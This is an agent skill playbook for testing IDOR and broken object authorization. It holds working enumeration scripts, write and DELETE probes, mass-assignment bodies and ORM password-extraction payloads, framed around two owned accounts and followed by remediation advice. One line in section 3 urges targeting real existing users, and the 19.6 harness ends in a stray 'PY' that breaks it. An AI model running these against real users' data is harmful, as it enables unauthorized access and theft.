---
name: idor-broken-object-authorization
description: >-
  IDOR and broken object authorization testing playbook. Use when requests expose object identifiers, tenant boundaries, writable fields, or missing object-level authorization checks.
---

# SKILL: IDOR / Broken Object Level Authorization — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: IDOR is the #1 bug bounty finding. This skill covers non-obvious IDOR surfaces, all attack vectors (not just URL params), A-B testing methodology, BOLA vs BFLA distinction, chaining IDOR to higher impact, and what testers repeatedly miss.
>
> **The evidence is object data belonging to another principal, obtained by changing an
> identifier, with the authorization context recorded.** Record *whose* token made the request
> and *whose* object came back. Prove with two accounts you own — never a stranger's data.
>
> **Two false positives get reported constantly**: an object that was genuinely public all along,
> and a `200` that returns an empty body or an error shape rather than real foreign data. Read the
> response body; do not grade on the status code.

## 0. RELATED ROUTING

- [attack-idor-automation](../attack-idor-automation/SKILL.md) — bulk enumeration and automation
- [api-authorization-and-bola](../api-authorization-and-bola/SKILL.md) — the API-authorization companion
- [api-auth-and-jwt-abuse](../api-auth-and-jwt-abuse/SKILL.md) — the token context you record as evidence
- [business-logic-vulnerabilities](../business-logic-vulnerabilities/SKILL.md) — state-machine and workflow abuse
- [graphql-exploitation-chains](../graphql-exploitation-chains/SKILL.md) — nested-object and relationship IDOR
- [security-reporting-and-documentation](../security-reporting-and-documentation/SKILL.md) — proving ownership cleanly

---

## 1. IDOR vs BOLA vs BFLA

| Term | Meaning | Impact |
|---|---|---|
| IDOR | Insecure Direct Object Reference | Read/modify other users' data |
| BOLA | Broken Object Level Authorization (OWASP API Top 10 A1) | Same as IDOR, API terminology |
| BFLA | Broken Function Level Authorization | Low-priv user accesses HIGH-PRIV functions (e.g., admin endpoints) |

**Key distinction**: 
- BOLA = accessing **object** you shouldn't own (data belonging to other users)
- BFLA = accessing **function** you shouldn't be authorized for (admin CRUD operations, bulk actions, user management)

---

## 2. WHERE TO FIND OBJECT IDs (ALL LOCATIONS)

Don't stop at URL path parameters — IDs appear in:

```
URL path:        GET /api/v1/users/1234/profile
URL query:       GET /orders?order_id=982
Request body:    {"userId": 1234, "action": "view"}
JSON fields:     {"resource": {"id": 5678, "type": "invoice"}}
Headers:         X-User-ID: 1234
                 X-Account-ID: 9999
Cookies:         user_id=1234; account=org_5678
GraphQL args:    query { user(id: "1234") { ... } }
Form fields:     <input name="documentId" value="5678">
WebSocket msgs:  {"event":"subscribe","channel_id":9999}
```

---

## 3. A-B TESTING METHODOLOGY

The most systematic IDOR test approach:

```
Step 1: Create two test accounts: UserA and UserB
Step 2: Perform all actions as UserA, capture all requests
        (profile edit, order view, password change, file access, etc.)
Step 3: Note every object ID created or accessed by UserA
Step 4: Authenticate as UserB
Step 5: Replay UserA's requests using UserB's session token
Step 6: If UserB can read/modify UserA's data → BOLA confirmed

Victim matters: for real bugs, target existing users, not test accounts.
Report evidence: show UserA owns the resource, UserB accessed it.
```

### Standing up the two-account harness

Two tokens you control, set as environment variables. Everything after this is a comparison
between A's token and B's token against the same request.

```bash
# Tokens for two accounts you own. A owns the object; B is the attacker.
export TOKEN_A='...'   # owner
export TOKEN_B='...'   # attacker (same privilege level, different principal)

# Sanity check: A must be able to read its own object. If this fails, you are testing the
# wrong endpoint or the wrong token.
curl -s -o /dev/null -w 'A->A %{http_code}\n' \
  -H "Authorization: Bearer $TOKEN_A" \
  'https://TARGET/api/v1/orders/OWN_ORDER_ID'

# The test: B requests A's object. A 200 with A's data is the finding; a 403 is a negative.
curl -s -w '\nB->A %{http_code}\n' \
  -H "Authorization: Bearer $TOKEN_B" \
  'https://TARGET/api/v1/orders/OWN_ORDER_ID'
```

```bash
# Capture the two responses side by side. The diff is your evidence: identical bodies mean B
# is reading A's object, not a redacted or empty placeholder.
curl -s -H "Authorization: Bearer $TOKEN_A" 'https://TARGET/api/v1/orders/OWN_ORDER_ID' > a.json
curl -s -H "Authorization: Bearer $TOKEN_B" 'https://TARGET/api/v1/orders/OWN_ORDER_ID' > b.json

if diff <(jq -S . a.json) <(jq -S . b.json) >/dev/null; then
  echo "IDENTICAL — B read A's object (BOLA confirmed)"
else
  echo "DIFFERENT — inspect which fields differed before concluding"
  diff <(jq -S . a.json) <(jq -S . b.json)
fi
```

```bash
# Sweep neighbours of A's ID with B's token. Record the status AND the size, because a 200
# carrying an empty object is not a finding.
for id in $(seq $((OWN_ID-2)) $((OWN_ID+2))); do
  curl -s -o /tmp/r.json -w "$id %{http_code} %{size_download}b\n" \
    -H "Authorization: Bearer $TOKEN_B" \
    "https://TARGET/api/v1/orders/$id"
done
```

```bash
# Write-side test: perform the same mutation with B's token and confirm it took effect by
# re-reading as A. Read-only tests miss the higher-severity write IDOR.
curl -s -X PATCH -H "Authorization: Bearer $TOKEN_B" -H 'Content-Type: application/json' \
  -d '{"note":"idor-write-test"}' 'https://TARGET/api/v1/orders/OWN_ORDER_ID' \
  -w '\nB-write %{http_code}\n'

curl -s -H "Authorization: Bearer $TOKEN_A" 'https://TARGET/api/v1/orders/OWN_ORDER_ID' \
  | jq -r '.note'
```

```bash
# Method-escalation sweep: an endpoint blocked on GET may not be blocked on PUT or PATCH,
# because authorization is often implemented per-method.
for m in GET POST PUT PATCH DELETE; do
  curl -s -o /dev/null -w "$m %{http_code}\n" -X $m \
    -H "Authorization: Bearer $TOKEN_B" -H 'Content-Type: application/json' \
    -d '{}' 'https://TARGET/api/v1/orders/OWN_ORDER_ID'
done
```

---

## 4. ID TYPE ITS IMPLICATIONS

| ID Pattern | Example | Notes |
|---|---|---|
| Sequential int | `id=1001` → `id=1002` | Easy prediction, high hit rate |
| UUID v4 | `550e8400-...` | Need to find UUID from other endpoints |
| UUID v1 | Clock-based UUID | Time-predictable! Extract timestamp/MAC |
| GUIDs from own data | See in responses | Collect all UUIDs from your own account data first |
| Hashed IDs | `md5(user_id)` | Try hashing sequential ints |
| Encoded IDs | base64(`{"id":1001}`) | Decode → modify → re-encode |
| Compound IDs | `/api/users/1/orders/5` | Both IDs may be independently verifiable |

---

## 5. HORIZONTAL vs VERTICAL PRIVILEGE ESCALATION

**Horizontal**: UserA accesses UserB's data (same privilege level)
```
GET /api/account/1234/statement     ← you are user 5678
```

**Vertical**: Low-priv user accesses admin-only functions
```
POST /api/admin/users/delete        ← normal user calling admin endpoint
GET /api/admin/all-users
PUT /api/users/1234/role {"role":"admin"}
```

**Combined**: Low-priv IDOR that grants privilege escalation
```
GET /api/v1/users/1/details → read admin user's auth token
```

---

## 6. HTTP METHOD ESCALATION

When `GET /resource/1234` is properly restricted, test ALL other verbs:

```http
GET    /api/v1/users/UserA_ID    ← might be blocked
POST   /api/v1/users/UserA_ID    ← different code path, might not check authz
PUT    /api/v1/users/UserA_ID    ← update another user's data
DELETE /api/v1/users/UserA_ID    ← delete another user's account
PATCH  /api/v1/users/UserA_ID    ← partial update (often missed in authz checks)
```

**Why this works**: Authorization logic is often implemented per-method, and developers forget edge cases.

---

## 7. PARAMETER POLLUTION & TYPE CONFUSION

When `id=1234` is validated, try:
```
id[]=1234&id[]=5678          ← array — app may use first or last
id=5678&id=1234              ← duplicate — app may prefer first or last
{"id": "1234"}               ← string vs int: might hit different code path
{"id": [1234]}               ← array in JSON
{"userId": 1234, "id": 5678} ← two ID fields — which is used for authz?
```

**JSON Type Confusion**:
```json
{"userId": "1234"}   vs   {"userId": 1234}
```
Some ORMs handle string vs integer differently in queries.

---

## 8. BFLA (FUNCTION LEVEL) ATTACKS

### Common BFLA Endpoints to Test

```http
# User management (admin-only in design):
GET /api/v1/admin/users
DELETE /api/v1/users/{any_user_id}
PUT /api/v1/users/{user_id}/role

# Bulk operations:
POST /api/v1/users/bulk-delete
GET /api/v1/export/all-data

# Billing/payment admin:
POST /api/v1/admin/subscription/modify
GET /api/v1/admin/payments/all

# Internal reporting:
GET /api/v1/reports/all-users-activity
```

### How to Find Hidden Admin Endpoints
1. Read JS bundles — admin routes often exposed in frontend code
2. Look at API docs (Swagger/OpenAPI) for "admin", "internal", "privileged" tags
3. Enumerate `/api/v1/admin/**`, `/api/v1/manage/**`, `/api/v1/internal/**`
4. Burp "Discover Content" on API base path
5. Compare regular user docs vs admin section docs if available

---

## 9. INDIRECT IDOR (REFERENCE CHAIN)

App checks permission on **object A** but doesn't check ownership of **referenced object B**:

**Example**:
```
UserA has permission to read their own messages.
GET /api/messages/1234 → checks: "does user own message 1234?" ✓

But: messages have attachments.
GET /api/attachments/5678 → doesn't check: "does attachment belong to message owned by user?"
```

Test: access attachments/sub-resources directly via their IDs without going through parent endpoint.

**GraphQL variant**: Inline querying related objects without separate authorization:
```graphql
query {
  myProfile {
    followers {
      privateEmail    ← accessing private field of OTHER users via relationship
    }
  }
}
```

---

## 10. MASS ASSIGNMENT → PRIVILEGE ESCALATION

When POST/PUT takes a JSON body, properties in the underlying model may be settable even if not in the official API docs:

```json
POST /api/v1/register
{
  "username": "attacker",
  "email": "a@evil.com",
  "password": "password",
  "role": "admin",          ← hidden field
  "isAdmin": true,          ← hidden field
  "verified": true,         ← skip email verification
  "creditBalance": 9999     ← give self credits
}
```

**How to find hidden fields**:
1. Intercept admin "create user" vs normal "register" — diff the fields
2. Read API documentation for all possible fields
3. Check source code if available (GitHub, JS bundles)
4. Fuzz with Burp: add common property names and check for `200` vs `400`

---

## 11. STATE MACHINE ABUSE (BUSINESS LOGIC IDOR)

When resources have a status/state:
```
order.status: pending → confirmed → shipped → delivered
```

Test: Can you skip states?
```
PUT /api/orders/1234 {"status": "delivered"}  ← from "pending"
PUT /api/orders/1234 {"status": "refunded"}   ← from "pending" (skip shipped)
```

Can you set another user's order status?
```
PUT /api/orders/UserA_order_id {"status": "cancelled"}  ← as UserB
```

---

## 12. QUICK IDOR CHECKLIST

```
□ Create 2 accounts (UserA + UserB)
□ Map all API calls that contain object IDs (Burp History export filter)
□ Test all HTTP verbs on each endpoint
□ Test ID in all locations: path, body, header, query, cookie
□ Try sequential IDs (−1, +1 from your own)
□ Try UUIDs/GUIDs collected from your own account data
□ Test sub-resources (attachments, comments, transactions)
□ Test admin endpoints directly (BFLA)
□ Test POST/PUT body for extra fields (mass assignment)
□ Compare JSON response field count vs documented fields (hidden fields)
□ Test state/status field modification
```

---

## 13. SYSTEMATIC IDOR TESTING — 8 CATEGORIES

| # | Category | Test Method |
|---|---|---|
| 1 | Direct ID reference | Change numeric/UUID ID in URL: `/api/users/123` → `/api/users/124` |
| 2 | Predictable UUID | If UUIDs are v1 (time-based), adjacent IDs are calculable |
| 3 | Batch/bulk operations | `/api/users/bulk?ids=123,456` — add other users' IDs |
| 4 | Export/download | Export endpoint leaks other users' data: `/export?user_id=*` |
| 5 | Linked object IDOR | Change `order.address_id` to another user's address |
| 6 | Resource replacement | Update own profile with another user's resource ID → overwrites |
| 7 | Write IDOR | PUT/PATCH/DELETE with other user's ID — modify/delete their data |
| 8 | Nested object | `/api/orgs/1/users/2` — change org ID to access other org's users |

### Testing Flow

```
1. Create two test accounts (A and B)
2. Perform all CRUD operations as A, capture all request IDs
3. Replay each request replacing A's IDs with B's IDs
4. Check: Can A read B's data? Modify? Delete?
5. Test with: numeric IDs, UUIDs, slugs, encoded values
6. Test across: URL path, query params, JSON body, headers
```

### Bulk enumeration with ffuf and a token

Turn a single confirmed hit into a scan. Autocalibration is the point: it filters the uniform
"denied" response so only the rows that differ from the baseline appear.

```bash
# Enumerate IDs with B's token. -ac drops responses that match the rejection baseline, so the
# surviving rows are the ones that returned something other than a denial.
ffuf -u 'https://TARGET/api/v1/orders/FUZZ' \
  -H "Authorization: Bearer $TOKEN_B" \
  -w <(seq 1 5000) \
  -mc all -ac -fr 'not found|forbidden|unauthorized' \
  -o idor-sweep.json
```

```bash
# Same sweep with a size filter when the denial body is a constant size. Calibrate the deny
# size first (here: 47 bytes), then keep everything that is not that size.
curl -s -H "Authorization: Bearer $TOKEN_B" 'https://TARGET/api/v1/orders/99999999' \
  -o /dev/null -w 'deny_size=%{size_download}\n'

seq 1 5000 | xargs -P 20 -I{} sh -c '
  s=$(curl -s -o /dev/null -w "%{size_download}" -H "Authorization: Bearer $TOKEN_B" \
        "https://TARGET/api/v1/orders/{}")
  [ "$s" != "47" ] && echo "{} size=$s"
'
```

```bash
# GraphQL: the same object-level check often sits behind the resolver. Replay the node query
# with B's token against A's node ID and compare the two payloads.
curl -s -X POST 'https://TARGET/graphql' \
  -H "Authorization: Bearer $TOKEN_B" -H 'Content-Type: application/json' \
  -d '{"query":"{ node(id:\"OWN_NODE_ID\"){ ... on Order { id total owner { email } } } }"}'
```

```bash
# Base64-encoded IDs: decode, change the number, re-encode, re-send. Padding and URL-safety
# both need handling.
echo 'eyJpZCI6MTAwMX0=' | base64 -d          # {"id":1001}
printf '{"id":1002}' | base64                 # eyJpZCI6MTAwMn0=
```

---

## 14. ORM FILTER CHAIN LEAKS

### Django ORM Filter Injection

```text
# Vulnerable: User.objects.filter(**request.data)
# Attacker sends: {"password__startswith": "a"}
# Django translates to: WHERE password LIKE 'a%'

# Character-by-character extraction:
POST /api/users/
{"username": "admin", "password__startswith": "a"}   → 200 (match)
{"username": "admin", "password__startswith": "b"}   → 404 (no match)
# Iterate through charset for each position

# Relational traversal:
{"author__user__password__startswith": "a"}
# Traverses: Author → User → password field

# On MySQL: ReDoS via regex
{"email__regex": "^(a+)+$"}  → CPU spike if match exists
```

### Prisma Filter Injection

```json
// Vulnerable: prisma.user.findMany({ where: req.body })
// Attacker sends nested include/select:
{
  "include": {
    "posts": {
      "include": {
        "author": {
          "select": {"password": true}
        }
      }
    }
  }
}
// Leaks password field through relation traversal
```

### Ransack (Ruby on Rails)

```
# Ransack allows search predicates via query params:
GET /users?q[password_cont]=admin
# Searches: WHERE password LIKE '%admin%'

# Character extraction:
GET /users?q[password_start]=a   → count results
GET /users?q[password_start]=ab  → narrow down
# Tool: plormber (automated Ransack extraction)
```

---

## 15. WHAT CONSTITUTES A FINDING

Grade by what the attacker principal obtained, not by the fact that an ID changed.

| Finding | Severity | Proof required |
|---|---|---|
| Read of another principal's objects at scale (bulk/enumerable) | **Critical (P1)** | your token, their data, and the enumeration |
| Write/modify/delete of another principal's object | **Critical (P1)** | before/after state showing the foreign object changed |
| Tenant boundary crossed (org A reads org B) | **Critical (P1)** | both principals and the crossed boundary |
| IDOR that escalates privilege (reads an admin object or token) | **Critical (P1)** | the privileged data or token, shown usable |
| Read of a single non-enumerable object with no sensitive fields | **Medium (P3)** | the two accounts and the object |
| Sequential ID that returns only your own object | **Not a finding** | the object is yours |
| `403` rendered as a JSON error body | **Not a finding** | no data was returned |
| Object is genuinely public (shared link, public profile) | **Not a finding** | confirm the intended-public state |

**Never test against a stranger's data.** Two accounts you own, always. Using a real user's
object is out of scope and turns a valid finding into an incident.

---

## 16. EVIDENCE STANDARD

| Item | Why |
|---|---|
| the request with the attacker's token, and the identifier changed | the mechanism |
| **the response body containing the foreign object's data** | the finding itself — not the status code |
| proof the object belongs to the other principal (a response as A showing ownership) | establishes the boundary crossed |
| a **control**: the same request as the owner (A→A), returning the same body | proves the data is real and permission-bound |
| for writes: before/after state, read back as the owner | proves the mutation landed |
| which accounts, and that both are yours | scope and ethics |
| the full request *and* the response, unredacted enough to be reproduced | triage |

**Do not grade on the status code.** A `200` may carry `{}` or an error object; a `403` may leak
data in its body. Read the body and diff it against the owner's response.

**False positives to exclude:**

| Looks like IDOR | Actually |
|---|---|
| the object is public by design | not a boundary crossing |
| sequential IDs here, UUIDs on the real endpoint | the real endpoint is not enumerable |
| a `403` whose body contains a helpful error | no data disclosed |
| the caller was granted a role that permits it | authorized access |
| a cached response served to both accounts by the CDN | cache, not authorization |
| changing the ID returns your own object | the app ignores the parameter |
| the response body is empty | nothing was disclosed |

---

## 17. REMEDIATION REFERENCE

1. **Authorize every object access against the session principal** — scope the query by owner (`WHERE id = ? AND owner_id = session.user`), not by ID alone.
2. **Do not rely on unguessable identifiers** — UUIDs are defence in depth, never the control. Enumerable IDs prove the point.
3. **Apply the check per method** — the `GET`/`PUT`/`PATCH`/`DELETE` code paths each need the same object-level check; per-method gaps are the classic miss.
4. **Deny by default on nested routes** — `/orgs/:org/users/:user` must verify membership in `:org` *and* access to `:user`.
5. **Allowlist mass-assignment fields** — never bind the request body to the model; `role`, `isAdmin`, `ownerId`, and `verified` are the fields attackers add.
6. **Return `404`, not `403`, for objects the caller cannot access** — it avoids confirming existence.
7. **Cover sub-resources and referenced objects** — attachments, comments, and `address_id`-style references need their own ownership check.
8. **Add an authorization test per endpoint to CI** — a second principal attempting the same request must fail.

---

## 18. CONFIRMING THE FINDING

| Step | Question | What it proves |
|---|---|---|
| 1 | Did you **obtain another principal's object**, not just change an id? | a data leak, not a 404 |
| 2 | Was there an **authorization control** - the same request with the owner's session, or a 403 on a protected id? | the check is missing, not permissive |
| 3 | Did the response contain **that owner's data**, named in the report? | impact |
| 4 | Did you test **both directions** - read and write - rather than read only? | the full impact |
| 5 | Is the id **enumerable**, and how wide is the reach? | the severity driver |
| 6 | Did you test the **same endpoint with the id removed, zeroed, and arrayed**? | the check's shape |
| 7 | Did you create **only test objects you own or were authorised to read**? | engagement integrity |

**Another principal's data in the response is the bar.** A `200` where you changed an id is a candidate;
the response body naming another user's record is the finding.

---

## 19. EXECUTION PRIMITIVES

IDOR is proven by **a response containing another principal's data, paired with the owner's-view
control**. Every block ends at an object you should not have.

### 19.1 Establish the two-account control

```bash
# REQUIREMENT: two accounts you are authorised to use - A owns objects, B does not
TOKA="<account A token>"; TOKB="<account B token>"
# A reads its own object - the baseline
curl -sS -H "Authorization: Bearer $TOKA" "https://target.example/api/v1/orders/1001" | head -c 400; echo
# B reads the SAME object - the finding, if it succeeds
curl -sS -o /dev/null -w 'B on A-object: %{http_code}\n' -H "Authorization: Bearer $TOKB" "https://target.example/api/v1/orders/1001"
# B reads its OWN object - the control that proves B's token works and the check is object-specific
curl -sS -H "Authorization: Bearer $TOKB" "https://target.example/api/v1/orders/2001" | head -c 200; echo
# and an unauthenticated read, which is a different finding entirely
curl -sS -o /dev/null -w 'anon:          %{http_code}\n' "https://target.example/api/v1/orders/1001"
```

**Three points: A-on-A, B-on-A, B-on-B.** Without the B-on-B control, a `403` on B-on-A may just mean B's
token is broken, and the whole test is void.

### 19.2 Enumerate the id space and measure the reach

```python
import requests
HOST, TOKB = "https://target.example", "<account B token>"
H = {"Authorization": f"Bearer {TOKB}"}

# the shape of the id: sequential, uuid, or slug
ids = [str(i) for i in range(1000, 1010)]
found = []
for i in ids:
    r = requests.get(f"{HOST}/api/v1/orders/{i}", headers=H, timeout=10)
    if r.status_code == 200:
        owner = r.json().get("user_id") or r.json().get("owner") or "?"
        found.append((i, owner, len(r.content)))
    print(i, r.status_code, len(r.content))
print()
mine = sum(1 for _, o, _ in found if str(o) == "<B's own id>")
others = [(i, o) for i, o, _ in found if str(o) != "<B's own id>"]
print(f"total readable {len(found)} | own {mine} | OTHER PRINCIPALS {len(others)}")
print("the count of other principals is the severity statement")
for i, o in others[:10]:
    print("   order", i, "belongs to", o)
```

**The count of other principals is the finding's severity.** "I read 8 orders belonging to 5 other
accounts" is the sentence; "IDOR exists" is not.

### 19.3 The check-shape tests, which find the bypasses

```bash
T="<account B token>"
# 1) the id removed, zeroed, and negatively indexed
for v in "" "0" "-1" "null" "undefined" "0000001001"; do
  printf '%-14s ' "/orders/$v"
  curl -sS -o /dev/null -w '%{http_code} %{size_download}\n' -H "Authorization: Bearer $T" "https://target.example/api/v1/orders/$v"
done
# 2) the array and comma forms, which some frameworks expand into an IN clause
curl -sS -H "Authorization: Bearer $T" "https://target.example/api/v1/orders?id=1001,1002" | head -c 300; echo
curl -sS -H "Authorization: Bearer $T" "https://target.example/api/v1/orders?id[]=1001&id[]=1002" | head -c 300; echo
# 3) the parameter pollution form, where a naive check reads the first and the data layer the last
curl -sS -H "Authorization: Bearer $T" "https://target.example/api/v1/orders?user_id=<B>&id=1001" | head -c 300; echo
# 4) and the nested route, where the parent is checked and the child is not
curl -sS -o /dev/null -w 'nested %{http_code}\n' -H "Authorization: Bearer $T" "https://target.example/api/v1/users/<B>/orders/1001"
```

**Each variant tests a different check shape.** The array form catches a framework that expands
parameters, the nested form catches a check applied to the parent only, and both are the most common real
bypasses.

### 19.4 The write side, which is a different severity

```bash
T="<account B token>"
# the read proves disclosure; the write proves integrity loss - test both
curl -sS -X PATCH -H "Authorization: Bearer $T" -H 'Content-Type: application/json' \
  -d '{"note":"pentest-marker"}' "https://target.example/api/v1/orders/1001" | head -c 300; echo
# and the DELETE, which is the most severe and the most disruptive - use a test object only
curl -sS -X DELETE -o /dev/null -w 'delete: %{http_code}\n' -H "Authorization: Bearer $T" \
  "https://target.example/api/v1/orders/2999"      # an object you created for this test
# THE CONTROL: the same write to B's OWN object must succeed, proving the verb and token work
curl -sS -X PATCH -H "Authorization: Bearer $T" -H 'Content-Type: application/json' \
  -d '{"note":"pentest-marker-own"}' "https://target.example/api/v1/orders/2001" | head -c 200; echo
# and the revert
curl -sS -X PATCH -H "Authorization: Bearer $T" -H 'Content-Type: application/json' \
  -d '{"note":""}' "https://target.example/api/v1/orders/1001" | head -c 200; echo
```

**Never write to an object you do not own beyond a reversible marker.** The own-object control proves the
write path works; the marker's removal proves the engagement left the data as found.

### 19.5 The report table, generated

```bash
python3 - <<'PY'
import requests
HOST = "https://target.example"
TOKA, TOKB = "<A>", "<B>"
OWNED_BY_B = {"2001", "2002"}

def get(oid, tok):
    r = requests.get(f"{HOST}/api/v1/orders/{oid}", headers={"Authorization": f"Bearer {tok}"}, timeout=10)
    return r.status_code, (r.json().get("user_id") if r.status_code == 200 and r.headers.get("content-type","").startswith("application/json") else None)

print("%-8s %-14s %-14s %s" % ("id", "A-token", "B-token", "verdict"))
for oid in ["1001","1002","2001","2002","9999"]:
    ca, oa = get(oid, TOKA); cb, ob = get(oid, TOKB)
    own = oid in OWNED_BY_B
    v = ("B CAN read A's object - FINDING" if cb == 200 and not own
         else "B own object - control" if own and cb == 200
         else "denied" if cb in (401,403,404) else "inspect")
    print("%-8s %-14s %-14s %s" % (oid, ca, cb, v))
print()
print("Include the owned-object control rows; they are what prove the token and the endpoint work.")
PY
```

**The table with its control rows is the deliverable.** A table of `200`s without the owned-object rows
cannot distinguish a broken authorization check from a public endpoint.

### 19.6 The end-to-end harness

```python
import requests
HOST, TOKA, TOKB = "https://target.example", "<A>", "<B>"
print("STEP 1 - does B's token work at all?")
r = requests.get(f"{HOST}/api/v1/orders/<B-own>", headers={"Authorization": f"Bearer {TOKB}"}, timeout=10)
print("  B on own object :", r.status_code, "<- must be 200, else the test is void")
print()
print("STEP 2 - the baseline with the owner's token")
r = requests.get(f"{HOST}/api/v1/orders/<A-own>", headers={"Authorization": f"Bearer {TOKA}"}, timeout=10)
print("  A on own object :", r.status_code, len(r.content))
print()
print("STEP 3 - the cross-principal read")
r = requests.get(f"{HOST}/api/v1/orders/<A-own>", headers={"Authorization": f"Bearer {TOKB}"}, timeout=10)
print("  B on A's object :", r.status_code, len(r.content), "<- the finding if 200")
print()
print("STEP 4 - the reach")
print("  ids probed: <N>   readable: <M>   belonging to others: <K>   distinct principals: <J>")
print()
print("STEP 5 - writes")
print("  a reversible marker written to one foreign object, then removed and verified")
print()
print("Report the control rows, the reach counts, and the response body fields that prove ownership.")
PY
```

**Control, baseline, cross-principal read, reach, writes.** Five steps; the second and third are the pair
that makes this a finding.

---

## 20. RELATED SIBLINGS - LOAD TOGETHER

- [api-authorization-and-bola](../api-authorization-and-bola/SKILL.md) - the API-side framing of the same defect
- [api-recon-and-docs](../api-recon-and-docs/SKILL.md) - how the object ids and routes are discovered in the first place
- [graphql-and-hidden-parameters](../graphql-and-hidden-parameters/SKILL.md) - the GraphQL node-id equivalent
- [idor-broken-object-authorization](../idor-broken-object-authorization/SKILL.md) - this document
- [business-logic-vulnerabilities](../business-logic-vulnerabilities/SKILL.md) - where an authorized action is abused rather than an object read
